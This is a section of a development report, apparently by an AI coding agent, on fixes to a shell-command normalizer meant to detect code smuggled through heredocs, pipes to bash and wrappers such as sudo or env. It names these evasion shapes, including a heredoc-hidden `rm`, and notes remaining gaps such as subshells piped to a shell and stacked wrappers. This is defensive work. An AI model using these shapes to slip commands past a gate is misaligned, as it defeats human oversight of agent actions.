before we ever get to our own depth-bounded descent). Typical-case per-call cost
(0.124ms) and `~user` latency (0.000685ms/token) show no regression from round 1's
numbers (0.127ms and 0.000662ms respectively — within measurement noise).

## Residual on Critical 2 — collision survived indirect shell reach

**Change, three parts as ruled, all three implemented (no need to fall back to part 1 alone):**

1. **`SimpleCommand.heredoc_bodies: list[str]`** (new additive field in `model.py`) —
   the literal text of every heredoc/here-string body attached to a command, recorded
   unconditionally regardless of whether it's ever parsed as code. Because
   `to_dict()`/`action_hash()` go through `dataclasses.asdict()`, this flows into the
   hash automatically with no changes needed to `to_dict()`/`action_hash()` themselves.
   This alone kills the collision for all three reported shapes, independent of whether
   detection in parts 2/3 is complete.
2. **Pipeline-wide shell detection.** `walk()`'s "pipeline" branch now pre-scans all
   direct `command` siblings (via a new lightweight `_peek_words` + `_shell_after_wrappers`,
   which reads raw AST word tokens without fully processing the node) to decide if *any*
   command in the pipe is a shell, before building any of them. `_command()` was
   refactored to return `(heredoc_bodies, argv)` instead of deciding internally whether
   to nested-parse, so the caller (`walk()`) can defer that decision until it knows about
   siblings not yet processed. All heredoc bodies collected from any command in the
   pipeline are parsed as code if any sibling is a shell. Covers `cat <<EOF | bash`.
3. **Wrapper-skipping.** New `_shell_after_wrappers(tokens)` skips one leading wrapper
   token (`env`, `command`, `nohup`, `timeout`, `sudo`, `doas`, matched by basename) and
   that wrapper's leading `-`-prefixed option tokens, then tests the next token against
   the shell-name set. Used both for the pipeline pre-scan (on raw AST peek tokens) and
   for the solo-command case (on the already-substituted `argv`, which is more accurate
   than the raw peek since it reflects any variable substitution).

Parts 2 and 3 did **not** interact badly with the pipeline/`pipeline_id` model — no need
to invoke the ruling's escape hatch and implement part 1 alone. The refactor was
contained: `_command()`'s return-value change and `walk()`'s pipeline branch restructure
were the only structural changes; `pipeline_id` assignment is unchanged (each command in
a pipeline still gets the same `pid` as before).

**Tests:** `test_heredoc_via_pipe_to_shell_does_not_collide_in_hash` (written and run
first per the instructions — watched it fail before anything else in this section),
`test_heredoc_via_pipe_to_shell_parses_inner_command`,
`test_heredoc_via_env_wrapped_shell_does_not_collide_in_hash`,
`test_heredoc_via_env_wrapped_shell_parses_inner_command`,
`test_heredoc_via_sudo_wrapped_shell_parses_inner_command`,
`test_heredoc_with_command_substitution_body_does_not_collide_in_hash` (the `cat`
non-shell case — body stays data, but hash must still differ).

**RED** (`uv run pytest tests/test_normalize_shell.py -k "heredoc_via or heredoc_with_command_substitution_body" -v`, before the fix):
```
FAILED test_heredoc_via_pipe_to_shell_does_not_collide_in_hash - hashes equal
FAILED test_heredoc_via_pipe_to_shell_parses_inner_command - 'rm' not in ['cat', 'bash']
FAILED test_heredoc_via_env_wrapped_shell_does_not_collide_in_hash - hashes equal
FAILED test_heredoc_via_env_wrapped_shell_parses_inner_command - 'rm' not in ['env', 'bash']
FAILED test_heredoc_via_sudo_wrapped_shell_parses_inner_command - 'rm' not in ['sudo', 'bash']
FAILED test_heredoc_with_command_substitution_body_does_not_collide_in_hash - hashes equal
```
All six reproduce the finding exactly (same hash values reported in the ruling's own
reproduction, e.g. `be6c8cd173fe6036` for the pipe case, confirmed identical on my run
before the fix).

**GREEN:** all six pass.

**Known limitations of parts 2/3 (disclosed, not fixed further this round):** the
pipeline pre-scan only inspects direct `command`-kind siblings — a subshell/compound
piped into a shell (`(cmd) | bash`) is not specially detected by the peek (its own
heredoc body, if any, stays opaque for visibility purposes, though part 1 still makes
its hash correct). Wrapper-skipping handles exactly one level (`sudo env bash` would
skip `sudo` but not chain into `env` too) — the ruling said "skip the wrapper"
(singular), and I implemented that literally rather than generalizing to arbitrary
stacking without being asked.

## Known limitation added to `reports/task-4-normalizer.md` (not a defect)

Verified directly: `bash <<'EOF'` and `bash <<"EOF"` (quoted/escaped heredoc delimiter)
both make bashlex 0.18's own parser raise `ParsingError`, so `normalize_shell` correctly
returns `unparseable=True` for both. This pre-dates fix round 1's work (it's a bashlex
limitation, confirmed by testing against the unmodified initial `bashlex.parse` call)
and fails closed correctly, so it's not a defect — but a quoted heredoc delimiter is
common, legitimate shell usage (e.g. an install script avoiding variable expansion
inside the heredoc body), so every such command will escalate through stage 1/2 rather
than being understood. Documented in `reports/task-4-normalizer.md` as a known
limitation/friction cost, not fixed (would require patching bashlex itself, outside this
task's allowed write scope and this round's requested scope).

## Corrected arithmetic (round 1's "14 new tests" claim)

Fixed above in the "Full-suite verification" section: the round-1 diff actually adds 25
test functions (1 domains + 5 paths + 13 shell + 6 init), verified via
`git diff b2a42b4 7630d23 -- <file> | grep -c '^+def test_'` per file. "14" was accurate
only for the subset written directly against the coordinator's numbered reproductions.
Also corrected the parallel claim in `reports/task-4-normalizer.md`.

## Full-suite verification (round 2)

```
cd service && uv run pytest -W error -q
```
```
101 passed in 0.21s
```
101 = 89 (round 1 total) + 12 new test functions this round (4 Important A + 2
Important B + 6 Critical 2 residual), verified via the same per-file `git diff` count.

## Files changed (fix round 2)

- `service/agentgate/normalize/model.py` — `SimpleCommand.heredoc_bodies` field
- `service/agentgate/normalize/shell.py` — flag-on-drop in `_collect_paths`/`_command`,
  nesting-depth bound (`_push_nesting`/`_pop_nesting`/`_MaxNestingDepthExceeded`),
  pipeline-wide shell pre-scan, wrapper-skipping (`_shell_after_wrappers`,
  `_peek_words`), `_command()` return-value refactor
- `service/tests/test_normalize_shell.py` — 12 new tests
- `reports/task-4-normalizer.md` — round 2 section, corrected test-count arithmetic,
  known-limitation note on quoted heredoc delimiters
- `.superpowers/task-4-report.md` — this section

## Self-review findings

- Caught my own test-construction bug (shared heredoc delimiter across nesting levels
  doesn't actually nest, in bash or bashlex) before it could misrepresent the depth-bound
  fix as broken; fixed the test helper and re-verified the RED reproduction was genuine
  after the fix, not an artifact of the bad construction.
- Verified the exact depth-8/depth-9 boundary manually (not just depth 400) to confirm
  "beyond 8, stop" is precise.
- Confirmed parts 2/3 of the Critical 2 residual did not require invoking the ruling's
  escape hatch — no report of difficulty needed, they integrated cleanly.
- Re-ran the full suite under `-W error -q`: 101 passed, pristine.
- `git status --short` (below) shows only the intended files touched.

## Concerns

None blocking. Two disclosed, narrow limitations carried into this round's fix (not
required by the ruling to close, and not previously reported): the pipeline pre-scan
doesn't look inside a subshell/compound sibling, and wrapper-skipping handles one level
only. Both are documented above and in `reports/task-4-normalizer.md`'s Critical 2
residual section.

## git status --short (before fix-round-2 commit)

```
 M service/agentgate/normalize/model.py
 M service/agentgate/normalize/shell.py
 M service/tests/test_normalize_shell.py
```
(`reports/task-4-normalizer.md` also modified, in scope for commit; `.superpowers/` not
committed, as before.)
